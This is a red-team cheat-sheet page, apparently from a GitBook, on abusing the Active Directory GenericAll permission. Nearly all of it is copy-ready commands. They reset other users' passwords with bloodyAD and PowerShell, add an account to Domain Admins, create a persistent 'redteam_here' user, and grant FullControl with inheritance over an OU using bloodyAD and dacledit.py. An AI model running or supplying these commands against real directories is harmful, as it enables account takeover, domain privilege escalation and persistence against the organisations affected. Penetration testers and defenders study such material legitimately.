---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/abuse-acls/genericall
---

# GenericAll

## GenericAll

### Reset Password

BloodyAD

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```
{% endcode %}

{% code title="AD-Module" %}
```powershell
# Net Command
net user vuln_user Password /domain

# AD-Module
$Password = ConvertTo-SecureString "Password123" -AsPlainText -Force 
Set-ADAccountPassword -Identity "khan.chanthou" -Reset -NewPassword $Password -Server "pp-dc.vulnableone.local"
```
{% endcode %}

### Add member to Group

```powershell
# Net Command
net group testgroup khan.chanthou /add /domain 

# AD-Module
Add-ADGroupMember -Identity "Domain Admins" -Members khan.chanthou -Server "pp-dc.vulnableone.local"
```

### Add User

{% code title="AD-Module" overflow="wrap" %}
```powershell
$username = "redteam_here"
$password = ConvertTo-SecureString "Password123" -AsPlainText -Force 

New-ADUser -SamAccountName $username -UserPrincipalName "$username@vulnableone.local" -Name $username -GivenName "redteam_here" -DisplayName "redteam_here" -Enabled $true -AccountPassword $password -ChangePasswordAtLogon $false -Server "pp-dc.vulnableone.local"
```
{% endcode %}

### GenericAll over OU

<figure><img src="../../../.gitbook/assets/Screenshot 2026-06-28 at 11.23.16 at night.png" alt=""><figcaption></figcaption></figure>

After this make us has GenericAll over user inside that OU as well&#x20;

{% code overflow="wrap" %}
```bash
bloodyAD -u 'steve.miller' -p 'pa$$w0rd' -d 'novaforge.local' --host 10.0.0.100 add genericAll 'OU=Tier1-Support,DC=NOVAFORGE,DC=LOCAL' 'steve.miller'

## or

dacledit.py novaforge.local/steve.miller:'Password@123' \
  -dc-ip 10.0.0.100 \
  -action write \
  -rights FullControl \
  -principal steve.miller \
  -target-dn 'OU=TIER1-SUPPORT,DC=NOVAFORGE,DC=LOCAL' \
  -inheritance
```
{% endcode %}
